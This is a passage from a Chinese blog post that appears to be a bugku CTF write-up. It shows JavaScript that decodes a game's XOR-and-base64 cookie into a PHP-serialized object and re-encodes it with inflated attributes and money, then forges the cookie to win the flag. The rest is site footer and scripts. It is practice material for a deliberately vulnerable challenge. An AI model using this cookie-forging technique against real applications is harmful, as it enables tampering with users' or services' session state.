<span class="javascript"><span class="hljs-keyword">var</span> temp = <span class="hljs-string">&quot;UTw7PCxqe3FjcC42OThOjWtSUFYwbm99amlzbG0wI3MeHBsUZ1liZxQMWEFDXl8EdUUOCgACd016B34WUlFWWTVoATEAAXF5P3Z2CmYgPTY5Pj90FSUUaGUfL2ZnYnYhCRMTGRQPQCcHKFIvEShXUlYCGQMbDQ4FXEcXREo/BTzBxKbu6fbrB+H+ps3nsLrP6dCs0LgR8fj1/+6y3+/apJ3XnJnkjNPf0NnRjpPD7pjzzfaMiJDcxt/XkP/B+I2C5vTqgUE=&quot;</span>;</span>
<span class="javascript"><span class="hljs-comment">//进行加密，获取明文</span></span>

<span class="javascript"><span class="hljs-keyword">var</span> base = <span class="hljs-keyword">new</span> Base64();</span>
<span class="javascript"><span class="hljs-keyword">var</span> result = base.decode(temp);</span>
<span class="javascript"><span class="hljs-keyword">var</span> result3 = <span class="hljs-string">&quot;&quot;</span>;</span>
for (i = 0; i &lt; result.length; i++) &#123;
<span class="javascript">	<span class="hljs-keyword">var</span> num = result[i].charCodeAt();</span>
	num = num ^ i;
	num = num - ((i % 10) + 2);
<span class="javascript">	result3 += <span class="hljs-built_in">String</span>.fromCharCode(num);</span>
&#125;
    
<span class="javascript"><span class="hljs-built_in">document</span>.write(<span class="hljs-string">&quot;原明文：&quot;</span>+result3+<span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>);</span>
<span class="javascript"><span class="hljs-built_in">document</span>.write(<span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>);</span>

<span class="javascript"><span class="hljs-keyword">var</span> result3 = <span class="hljs-string">&#x27;O:5:&quot;human&quot;:10:&#123;s:8:&quot;xueliang&quot;;i:830;s:5:&quot;neili&quot;;i:602;s:5:&quot;lidao&quot;;i:95;s:6:&quot;dingli&quot;;i:63;s:7:&quot;waigong&quot;;i:0;s:7:&quot;neigong&quot;;i:0;s:7:&quot;jingyan&quot;;i:0;s:6:&quot;yelian&quot;;i:0;s:5:&quot;money&quot;;i:200000;s:4:&quot;flag&quot;;s:1:&quot;0&quot;;&#125;&#x27;</span>;</span>
<span class="javascript"><span class="hljs-comment">//反编码获取cookie</span></span>
<span class="javascript"><span class="hljs-keyword">var</span> result = <span class="hljs-string">&quot;&quot;</span>;</span>
for (i = 0;i&lt;result3.length;i++)&#123;
	num = result3[i].charCodeAt();
	num = num + ((i % 10) + 2);
	num = num ^ i;
<span class="javascript">	result += <span class="hljs-built_in">String</span>.fromCharCode(num);</span>
&#125;
<span class="javascript"><span class="hljs-keyword">var</span> temp= base.encode(result);</span>

<span class="javascript"><span class="hljs-comment">//将cookie进行url编码</span></span>
<span class="javascript">temp = <span class="hljs-built_in">encodeURIComponent</span>(temp);</span>
<span class="javascript"><span class="hljs-built_in">document</span>.write(<span class="hljs-string">&quot;cookie:&quot;</span>+temp+<span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>);</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre></div>



<p>编码结果</p>
<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">UTw7PCxqe3FjcC42OThOjWtSUFYwbm99amlzbG0wI3MeHBsUZ1liZxQMWEFDXl8EdUUOCgACd016B34WUlFWWTVoATEAAXF5P3Z2CmYgPTY5Pj90FSUUaGUfL2ZnYnYhCRMTGRQPQCcHKFIvEShXUlYCGQMbDQ4FXEcXREo</span>%<span class="hljs-number">2</span>FBTzBxKbu<span class="hljs-number">6</span>fbrB%<span class="hljs-number">2</span>BH%<span class="hljs-number">2</span>Bps<span class="hljs-number">3</span>nsLrP<span class="hljs-number">6</span>dCs<span class="hljs-number">0</span>LgR<span class="hljs-number">8</span>fj<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>B<span class="hljs-number">6</span>y<span class="hljs-number">3</span>%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>FapJ<span class="hljs-number">3</span>XnJnkjNPf<span class="hljs-number">0</span>NnRjpPD<span class="hljs-number">7</span>paIiIiIhovBiIL<span class="hljs-number">4</span>kNTK<span class="hljs-number">0</span>dea%<span class="hljs-number">2</span>F<span class="hljs-number">7</span>mC%<span class="hljs-number">2</span>B<span class="hljs-number">4</span>bu%<span class="hljs-number">2</span>FOr<span class="hljs-number">1</span>SQ%<span class="hljs-number">3</span>D%<span class="hljs-number">3</span>D</code></pre></div>

<p>这就是我们期待的cookie,然后用工具修改cookie</p>
<p><img src="https://i.loli.net/2020/11/25/WMk48YRo5veBxXr.png" srcset="/img/loading.gif" alt="nt-9.png"></p>
<p>修满属性值打怪拿到flag</p>
<p><img src="https://i.loli.net/2020/11/25/5Geyh8r7vBDOqKE.png" srcset="/img/loading.gif" alt="mt-10.png"></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_41924764/article/details/109488408?utm_medium=distribute.pc_relevant.none-task-blog-title-2&spm=1001.2101.3001.4242">参考</a></p>
<p>这道题虽然很难，但是在一步一步尝试的过程中学到很多有用的东西，收获还是很大的，感谢师傅的wp，看了好久才做出了。</p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/ctf/">ctf</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/%E8%84%9A%E6%9C%AC/">脚本</a>
                    
                      <a class="hover-with-bg" href="/tags/php/">php</a>
                    
                      <a class="hover-with-bg" href="/tags/cookie/">cookie</a>
                    
                      <a class="hover-with-bg" href="/tags/%E7%BC%96%E7%A0%81/">编码</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
              
              
                <div class="post-prevnext row">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2020/09/14/decode/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">bugku代码审计</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2020/09/06/bugku1-10/">
                        <span class="hidden-mobile">bugku1-10</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
              <!-- Comments -->
              <article class="comments" id="comments">
                
                
  <div id="vcomments"></div>
  <script type="text/javascript">
    function loadValine() {
      addScript('https://cdn.jsdelivr.net/gh/HCLonely/Valine@latest/dist/Valine.min.js', function () {
        new Valine({
          el: "#vcomments",
          app_id: "2rPljbm5WOxA9BCPXqy3VE5y-gzGzoHsz",
          app_key: "SCoIn2Qp99a7ITtPhkAi6Chw",
          placeholder: "说点什么吧~~~",
          path: window.location.pathname,
          avatar: "retro",
          meta: ["nick","mail","link"],
          pageSize: "10",
          lang: "zh-CN",
          highlight: true,
          recordIP: false,
          serverURLs: "",
          master: "4cd096660a71d786a2a4d9d0bb4e8996",
          friends: "b275f0fc8103331da645a878cf60f841",
          tagMeta: ["博主","友人","访客"],
        });
      });
    }
    waitElementVisible('vcomments', loadValine);
  </script>
  <noscript>Please enable JavaScript to view the <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments
      powered by Valine.</a></noscript>


              </article>
            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div id="tocbot"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->

  <div class="col-lg-7 mx-auto nopadding-md">
    <div class="container custom post-content mx-auto">
      <img src="https://octodex.github.com/images/jetpacktocat.png" srcset="/img/loading.gif" class="rounded mx-auto d-block mt-5" style="width:150px; height:150px;">
    </div>
  </div>


    
  </main>

  
    <a id="scroll-top-button" href="#" role="button">
      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- 不蒜子统计PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            总访问量 
            <span id="busuanzi_value_site_pv"></span>
             次
          </span>
      
      
        <!-- 不蒜子统计UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            总访客数 
            <span id="busuanzi_value_site_uv"></span>
             人
          </span>
      
    
  </div>


  

  
</footer>

<!-- SCRIPTS -->
<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/main.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/lazyload.js" ></script>
  



  



  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
  <script  src="/js/clipboard-use.js" ></script>



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
  <script>
    $(document).ready(function () {
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;

      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '#post-body',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        collapseDepth: 0,
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc').css('visibility', 'visible');
      }
    });
  </script>



  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "bugku刷题记录2&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: true,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
      icon: "§"
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      searchFunc(path, 'local-search-input', 'local-search-result');
      this.onclick = null
    }
  </script>



  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />

  <script>
    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
      function () {
        var element = document.createElement('a');
        $(element).attr('data-fancybox', 'images');
        $(element).attr('href', $(this).attr('src'));
        $(this).wrap(element);
      }
    );
  </script>












  

  

  

  

  

  



<div class="text-center py-1">   
  <div>
    <span>Copyright © 2020</span></a>
    <a href="http://sunzy.icu/" target="_blank" rel="nofollow noopener">
     <span>my blog</span></a>    <br>
  </div>
<div>
  <span id="timeDate">载入天数...</span>
  <span id="times">载入时分秒...</span>
  <script>
  var now = new Date();
  function createtime(){
      var grt= new Date("03/02/2020 00:00:00");//此处修改你的建站时间或者网站上线时间
      now.setTime(now.getTime()+250);
      days = (now - grt ) / 1000 / 60 / 60 / 24;
      dnum = Math.floor(days);
      hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
      hnum = Math.floor(hours);
      if(String(hnum).length ==1 ){
          hnum = "0" + hnum;
      }
      minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
      mnum = Math.floor(minutes);
      if(String(mnum).length ==1 ){
                mnum = "0" + mnum;
      }
      seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
      snum = Math.round(seconds);
      if(String(snum).length ==1 ){
                snum = "0" + snum;
      }
      document.getElementById("timeDate").innerHTML = "🚀 for&nbsp"+dnum+"&nbspdays";  //此次自定义显示内容
      document.getElementById("times").innerHTML = hnum + "&nbsphr&nbsp" + mnum + "&nbspmin&nbsp" + snum + "&nbspsec";
  }  //此次自定义显示内容
  setInterval("createtime()",250);
  </script>
</div>

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
</html>
